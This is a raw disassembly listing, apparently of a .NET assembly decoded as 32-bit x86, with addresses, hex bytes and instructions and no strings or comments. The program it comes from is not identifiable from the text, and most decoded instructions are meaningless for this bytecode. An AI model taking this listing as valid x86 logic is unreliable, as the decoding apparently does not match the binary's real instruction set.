  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 6a             	or     0x6a(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	e2 01                	loop   0x403da7
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 70                	jb     0x403e31
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	39 a4 01 00 00 07 72 	cmp    %esp,0x72070000(%ecx,%eax,1)
  403dd7:	d0 25 00 70 28 25    	shlb   $1,0x25287000
  403ddd:	00 00                	add    %al,(%eax)
  403ddf:	0a 3a                	or     (%edx),%bh
  403de1:	25 00 00 00 07       	and    $0x7000000,%eax
  403de6:	72 da                	jb     0x403dc2
  403de8:	25 00 70 28 25       	and    $0x25287000,%eax
  403ded:	00 00                	add    %al,(%eax)
  403def:	0a 3a                	or     (%edx),%bh
  403df1:	60                   	pusha
  403df2:	00 00                	add    %al,(%eax)
  403df4:	00 07                	add    %al,(%edi)
  403df6:	72 e8                	jb     0x403de0
  403df8:	25 00 70 28 25       	and    $0x25287000,%eax
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	0a 3a                	or     (%edx),%bh
  403e01:	d9 00                	flds   (%eax)
  403e03:	00 00                	add    %al,(%eax)
  403e05:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e08:	00 00                	add    %al,(%eax)
  403e0a:	16                   	push   %ss
  403e0b:	28 1a                	sub    %bl,(%edx)
  403e0d:	00 00                	add    %al,(%eax)
  403e0f:	06                   	push   %es
  403e10:	73 94                	jae    0x403da6
  403e12:	00 00                	add    %al,(%eax)
  403e14:	06                   	push   %es
  403e15:	25 72 70 21 00       	and    $0x217072,%eax
  403e1a:	70 6f                	jo     0x403e8b
  403e1c:	7f 00                	jg     0x403e1e
  403e1e:	00 06                	add    %al,(%esi)
  403e20:	72 d0                	jb     0x403df2
  403e22:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e27:	00 00                	add    %al,(%eax)
  403e29:	06                   	push   %es
  403e2a:	25 72 88 21 00       	and    $0x218872,%eax
  403e2f:	70 6f                	jo     0x403ea0
  403e31:	7f 00                	jg     0x403e33
  403e33:	00 06                	add    %al,(%esi)
  403e35:	28 17                	sub    %dl,(%edi)
  403e37:	00 00                	add    %al,(%eax)
  403e39:	06                   	push   %es
  403e3a:	6a 6f                	push   $0x6f
  403e3c:	74 00                	je     0x403e3e
  403e3e:	00 06                	add    %al,(%esi)
  403e40:	6f                   	outsl  %ds:(%esi),(%dx)
  403e41:	89 00                	mov    %eax,(%eax)
  403e43:	00 06                	add    %al,(%esi)
  403e45:	28 20                	sub    %ah,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	16                   	push   %ss
  403e4b:	28 18                	sub    %bl,(%eax)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	06                   	push   %es
  403e50:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e53:	00 00                	add    %al,(%eax)
  403e55:	00 06                	add    %al,(%esi)
  403e57:	72 fe                	jb     0x403e57
  403e59:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e5e:	00 00                	add    %al,(%eax)
  403e60:	06                   	push   %es
  403e61:	6f                   	outsl  %ds:(%esi),(%dx)
  403e62:	8b 00                	mov    (%eax),%eax
  403e64:	00 06                	add    %al,(%esi)
  403e66:	28 42 00             	sub    %al,0x0(%edx)
  403e69:	00 06                	add    %al,(%esi)
  403e6b:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e6f:	00 7e 24             	add    %bh,0x24(%esi)
  403e72:	00 00                	add    %al,(%eax)
  403e74:	04 06                	add    $0x6,%al
  403e76:	6f                   	outsl  %ds:(%esi),(%dx)
  403e77:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e7c:	94                   	xchg   %eax,%esp
  403e7d:	00 00                	add    %al,(%eax)
  403e7f:	06                   	push   %es
  403e80:	25 72 70 21 00       	and    $0x217072,%eax
  403e85:	70 6f                	jo     0x403ef6
  403e87:	7f 00                	jg     0x403e89
  403e89:	00 06                	add    %al,(%esi)
  403e8b:	72 06                	jb     0x403e93
  403e8d:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e91:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e97:	1c 26                	sbb    $0x26,%al
  403e99:	00 70 6f             	add    %dh,0x6f(%eax)
  403e9c:	7f 00                	jg     0x403e9e
  403e9e:	00 06                	add    %al,(%esi)
  403ea0:	06                   	push   %es
  403ea1:	72 fe                	jb     0x403ea1
  403ea3:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea8:	00 00                	add    %al,(%eax)
  403eaa:	06                   	push   %es
  403eab:	6f                   	outsl  %ds:(%esi),(%dx)
  403eac:	8b 00                	mov    (%eax),%eax
  403eae:	00 06                	add    %al,(%esi)
  403eb0:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb1:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	06                   	push   %es
  403eba:	28 20                	sub    %ah,(%eax)
  403ebc:	00 00                	add    %al,(%eax)
  403ebe:	06                   	push   %es
  403ebf:	38 06                	cmp    %al,(%esi)
  403ec1:	00 00                	add    %al,(%eax)
  403ec3:	00 06                	add    %al,(%esi)
  403ec5:	28 47 00             	sub    %al,0x0(%edi)
  403ec8:	00 06                	add    %al,(%esi)
  403eca:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403ed0:	b3 00                	mov    $0x0,%bl
  403ed2:	00 0a                	add    %cl,(%edx)
  403ed4:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed7:	00 06                	add    %al,(%esi)
  403ed9:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403edf:	72 2a                	jb     0x403f0b
  403ee1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ee5:	7f 00                	jg     0x403ee7
  403ee7:	00 06                	add    %al,(%esi)
  403ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  403eea:	8b 00                	mov    (%eax),%eax
  403eec:	00 06                	add    %al,(%esi)
  403eee:	06                   	push   %es
  403eef:	72 fe                	jb     0x403eef
  403ef1:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef6:	00 00                	add    %al,(%eax)
  403ef8:	06                   	push   %es
  403ef9:	6f                   	outsl  %ds:(%esi),(%dx)
  403efa:	7a 00                	jp     0x403efc
  403efc:	00 06                	add    %al,(%esi)
  403efe:	28 41 00             	sub    %al,0x0(%ecx)
  403f01:	00 06                	add    %al,(%esi)
  403f03:	26 7e 24             	es jle 0x403f2a
  403f06:	00 00                	add    %al,(%eax)
  403f08:	04 28                	add    $0x28,%al
  403f0a:	01 00                	add    %eax,(%eax)
  403f0c:	00 2b                	add    %ch,(%ebx)
  403f0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0f:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f14:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f18:	00 12                	add    %dl,(%edx)
  403f1a:	02 28                	add    (%eax),%ch
  403f1c:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f21:	09 72 fe             	or     %esi,-0x2(%edx)
  403f24:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	06                   	push   %es
  403f2c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f2d:	8b 00                	mov    (%eax),%eax
  403f2f:	00 06                	add    %al,(%esi)
  403f31:	06                   	push   %es
  403f32:	72 2a                	jb     0x403f5e
  403f34:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f38:	7f 00                	jg     0x403f3a
  403f3a:	00 06                	add    %al,(%esi)
  403f3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f3d:	8b 00                	mov    (%eax),%eax
  403f3f:	00 06                	add    %al,(%esi)
  403f41:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f47:	12 00                	adc    (%eax),%al
  403f49:	00 00                	add    %al,(%eax)
  403f4b:	09 28                	or     %ebp,(%eax)
  403f4d:	47                   	inc    %edi
  403f4e:	00 00                	add    %al,(%eax)
  403f50:	06                   	push   %es
  403f51:	7e 24                	jle    0x403f77
  403f53:	00 00                	add    %al,(%eax)
  403f55:	04 09                	add    $0x9,%al
  403f57:	6f                   	outsl  %ds:(%esi),(%dx)
  403f58:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f5d:	12 02                	adc    (%edx),%al
  403f5f:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f65:	b3 dd                	mov    $0xdd,%bl
  403f67:	0e                   	push   %cs
  403f68:	00 00                	add    %al,(%eax)
  403f6a:	00 12                	add    %dl,(%edx)
  403f6c:	02 fe                	add    %dh,%bh
  403f6e:	16                   	push   %ss
  403f6f:	04 00                	add    $0x0,%al
  403f71:	00 1b                	add    %bl,(%ebx)
  403f73:	6f                   	outsl  %ds:(%esi),(%dx)
  403f74:	33 00                	xor    (%eax),%eax
  403f76:	00 0a                	add    %cl,(%edx)
  403f78:	dc dd                	(bad)
  403f7a:	0f 00 00             	sldt   (%eax)
  403f7d:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f80:	00 00                	add    %al,(%eax)
  403f82:	0a 28                	or     (%eax),%ch
  403f84:	49                   	dec    %ecx
  403f85:	00 00                	add    %al,(%eax)
  403f87:	06                   	push   %es
  403f88:	dd 00                	fldl   (%eax)
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 2a                	add    %ch,(%edx)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	41                   	inc    %ecx
  403f91:	4c                   	dec    %esp
  403f92:	00 00                	add    %al,(%eax)
  403f94:	00 00                	add    %al,(%eax)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	aa                   	stos   %al,%es:(%edi)
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	00 79 00             	add    %bh,0x0(%ecx)
  403f9e:	00 00                	add    %al,(%eax)
  403fa0:	23 01                	and    (%ecx),%eax
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	0f 00 00             	sldt   (%eax)
  403fa7:	00 31                	add    %dh,(%ecx)
  403fa9:	00 00                	add    %al,(%eax)
  403fab:	01 02                	add    %eax,(%edx)
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 68 01             	add    %ch,0x1(%eax)
  403fb2:	00 00                	add    %al,(%eax)
  403fb4:	57                   	push   %edi
  403fb5:	00 00                	add    %al,(%eax)
  403fb7:	00 bf 01 00 00 0e    	add    %bh,0xe000001(%edi)
	...
  403fc9:	00 00                	add    %al,(%eax)
  403fcb:	00 d2                	add    %dl,%dl
  403fcd:	01 00                	add    %eax,(%eax)
  403fcf:	00 d2                	add    %dl,%dl
  403fd1:	01 00                	add    %eax,(%eax)
  403fd3:	00 0f                	add    %cl,(%edi)
  403fd5:	00 00                	add    %al,(%eax)
  403fd7:	00 31                	add    %dh,(%ecx)
  403fd9:	00 00                	add    %al,(%eax)
  403fdb:	01 13                	add    %edx,(%ebx)
  403fdd:	30 0b                	xor    %cl,(%ebx)
  403fdf:	00 11                	add    %dl,(%ecx)
  403fe1:	01 00                	add    %eax,(%eax)
  403fe3:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fe6:	00 11                	add    %dl,(%ecx)
  403fe8:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fee:	72 fe                	jb     0x403fee
  403ff0:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ff5:	00 00                	add    %al,(%eax)
  403ff7:	06                   	push   %es
  403ff8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff9:	8b 00                	mov    (%eax),%eax
  403ffb:	00 06                	add    %al,(%esi)
  403ffd:	28 42 00             	sub    %al,0x0(%edx)
  404000:	00 06                	add    %al,(%esi)
  404002:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404008:	c0 00 00             	rolb   $0x0,(%eax)
  40400b:	0a 72 34             	or     0x34(%edx),%dh
  40400e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404012:	c1 00 00             	roll   $0x0,(%eax)
  404015:	0a 28                	or     (%eax),%ch
  404017:	c2 00 00             	ret    $0x0
  40401a:	0a 0a                	or     (%edx),%cl
  40401c:	7e 25                	jle    0x404043
  40401e:	00 00                	add    %al,(%eax)
  404020:	04 3a                	add    $0x3a,%al
  404022:	85 00                	test   %eax,(%eax)
  404024:	00 00                	add    %al,(%eax)
  404026:	20 00                	and    %al,(%eax)
  404028:	01 00                	add    %eax,(%eax)
  40402a:	00 72 50             	add    %dh,0x50(%edx)
  40402d:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404031:	d0 0f                	rorb   $1,(%edi)
  404033:	00 00                	add    %al,(%eax)
  404035:	02 28                	add    (%eax),%ch
  404037:	c3                   	ret
  404038:	00 00                	add    %al,(%eax)
  40403a:	0a 1f                	or     (%edi),%bl
  40403c:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  404042:	25 16 16 14 28       	and    $0x28141616,%eax
  404047:	c4 00                	les    (%eax),%eax
  404049:	00 0a                	add    %cl,(%edx)
  40404b:	a2 25 17 17 14       	mov    %al,0x14171725
  404050:	28 c4                	sub    %al,%ah
  404052:	00 00                	add    %al,(%eax)
  404054:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  40405a:	28 c4                	sub    %al,%ah
  40405c:	00 00                	add    %al,(%eax)
  40405e:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  404064:	28 c4                	sub    %al,%ah
  404066:	00 00                	add    %al,(%eax)
  404068:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40406e:	28 c4                	sub    %al,%ah
  404070:	00 00                	add    %al,(%eax)
  404072:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404078:	28 c4                	sub    %al,%ah
  40407a:	00 00                	add    %al,(%eax)
  40407c:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  404082:	28 c4                	sub    %al,%ah
  404084:	00 00                	add    %al,(%eax)
  404086:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40408c:	28 c4                	sub    %al,%ah
  40408e:	00 00                	add    %al,(%eax)
  404090:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  404096:	28 c4                	sub    %al,%ah
  404098:	00 00                	add    %al,(%eax)
  40409a:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  4040a0:	0a 28                	or     (%eax),%ch
  4040a2:	c6 00 00             	movb   $0x0,(%eax)
  4040a5:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040ab:	7e 25                	jle    0x4040d2
  4040ad:	00 00                	add    %al,(%eax)
  4040af:	04 7b                	add    $0x7b,%al
  4040b1:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040b7:	00 00                	add    %al,(%eax)
  4040b9:	04 06                	add    $0x6,%al
  4040bb:	28 06                	sub    %al,(%esi)
  4040bd:	00 00                	add    %al,(%eax)
  4040bf:	06                   	push   %es
  4040c0:	7e 0b                	jle    0x4040cd
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	04 7e                	add    $0x7e,%al
  4040c6:	10 00                	adc    %al,(%eax)
  4040c8:	00 04 02             	add    %al,(%edx,%eax,1)
  4040cb:	72 58                	jb     0x404125
  4040cd:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040d1:	7f 00                	jg     0x4040d3
  4040d3:	00 06                	add    %al,(%esi)
  4040d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040d6:	7a 00                	jp     0x4040d8
  4040d8:	00 06                	add    %al,(%esi)
  4040da:	7e 1e                	jle    0x4040fa
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	04 7e                	add    $0x7e,%al
  4040e0:	08 00                	or     %al,(%eax)
  4040e2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040e5:	0f 00 00             	sldt   (%eax)
  4040e8:	04 7e                	add    $0x7e,%al
  4040ea:	04 00                	add    $0x0,%al
  4040ec:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040ef:	c8 00 00 0a          	enter  $0x0,$0xa
  4040f3:	28 48 00             	sub    %cl,0x0(%eax)
  4040f6:	00 06                	add    %al,(%esi)
  4040f8:	2a 00                	sub    (%eax),%al
  4040fa:	00 00                	add    %al,(%eax)
  4040fc:	1b 30                	sbb    (%eax),%esi
  4040fe:	03 00                	add    (%eax),%eax
  404100:	5c                   	pop    %esp
  404101:	00 00                	add    %al,(%eax)
  404103:	00 15 00 00 11 02    	add    %dl,0x2110000
  404109:	28 18                	sub    %bl,(%eax)
  40410b:	00 00                	add    %al,(%eax)
  40410d:	0a 03                	or     (%ebx),%al
  40410f:	28 ca                	sub    %cl,%dl
  404111:	00 00                	add    %al,(%eax)
  404113:	0a 39                	or     (%ecx),%bh
  404115:	0b 00                	or     (%eax),%eax
  404117:	00 00                	add    %al,(%eax)
  404119:	72 86                	jb     0x4040a1
  40411b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40411f:	cb                   	lret
  404120:	00 00                	add    %al,(%eax)
  404122:	0a 7a 03             	or     0x3(%edx),%bh
  404125:	7e 2c                	jle    0x404153
  404127:	00 00                	add    %al,(%eax)
  404129:	04 20                	add    $0x20,%al
  40412b:	50                   	push   %eax
  40412c:	c3                   	ret
  40412d:	00 00                	add    %al,(%eax)
  40412f:	73 cc                	jae    0x4040fd
  404131:	00 00                	add    %al,(%eax)
  404133:	0a 0a                	or     (%edx),%cl
  404135:	02 06                	add    (%esi),%al
  404137:	1f                   	pop    %ds
  404138:	20 6f cd             	and    %ch,-0x33(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404140:	00 00                	add    %al,(%eax)
  404142:	04 02                	add    $0x2,%al
  404144:	06                   	push   %es
  404145:	1f                   	pop    %ds
  404146:	40                   	inc    %eax
  404147:	6f                   	outsl  %ds:(%esi),(%dx)
  404148:	cd 00                	int    $0x0
  40414a:	00 0a                	add    %cl,(%edx)
  40414c:	7d 2b                	jge    0x404179
  40414e:	00 00                	add    %al,(%eax)
  404150:	04 dd                	add    $0xdd,%al
  404152:	0d 00 00 00 06       	or     $0x6000000,%eax
  404157:	39 06                	cmp    %eax,(%esi)
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 06                	add    %al,(%esi)
  40415d:	6f                   	outsl  %ds:(%esi),(%dx)
  40415e:	33 00                	xor    (%eax),%eax
  404160:	00 0a                	add    %cl,(%edx)
  404162:	dc 2a                	fsubrl (%edx)
  404164:	01 10                	add    %edx,(%eax)
  404166:	00 00                	add    %al,(%eax)
  404168:	02 00                	add    (%eax),%al
  40416a:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  40416f:	0d 00 00 00 00       	or     $0x0,%eax
  404174:	1b 30                	sbb    (%eax),%esi
  404176:	05 00 15 01 00       	add    $0x11500,%eax
  40417b:	00 16                	add    %dl,(%esi)
  40417d:	00 00                	add    %al,(%eax)
  40417f:	11 03                	adc    %eax,(%ebx)
  404181:	3a 0b                	cmp    (%ebx),%cl
  404183:	00 00                	add    %al,(%eax)
  404185:	00 72 ce             	add    %dh,-0x32(%edx)
  404188:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40418c:	cf                   	iret
  40418d:	00 00                	add    %al,(%eax)
  40418f:	0a 7a 73             	or     0x73(%edx),%bh
  404192:	d0 00                	rolb   $1,(%eax)
  404194:	00 0a                	add    %cl,(%edx)
  404196:	0a 06                	or     (%esi),%al
  404198:	1f                   	pop    %ds
  404199:	20 6a 6f             	and    %ch,0x6f(%edx)
  40419c:	4e                   	dec    %esi
  40419d:	00 00                	add    %al,(%eax)
  40419f:	0a 73 d1             	or     -0x2f(%ebx),%dh
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	0a 0b                	or     (%ebx),%cl
  4041a6:	07                   	pop    %es
